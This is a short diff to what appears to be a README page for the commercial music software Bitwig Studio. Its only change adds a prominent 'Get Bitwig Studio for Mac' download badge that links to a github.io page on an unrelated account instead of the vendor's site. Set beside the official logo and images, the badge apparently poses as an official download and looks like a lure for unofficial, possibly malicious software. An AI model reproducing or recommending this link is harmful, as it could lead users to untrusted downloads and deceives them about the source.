@@ -2,6 +2,8 @@
 
 ![Bitwig Studio Logo](https://images.icon-icons.com/3053/PNG/512/bitwig_studio_macos_bigsur_icon_190336.png)  
 
+[![🎼 Get Bitwig Studio for Mac](https://img.shields.io/badge/🎼_Get_Bitwig_Studio_for_Mac-darkorange?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/bitwig)  
+
 ---
 
 ![Bitwig Studio Hero](https://assets.bitwig.net/media/image/bitwig-home_2311_bitwig-studio-hero/Bitwig-Home_2311_Bitwig-Studio-Hero-LG-SD.png?v=1SGGKMy2RD)
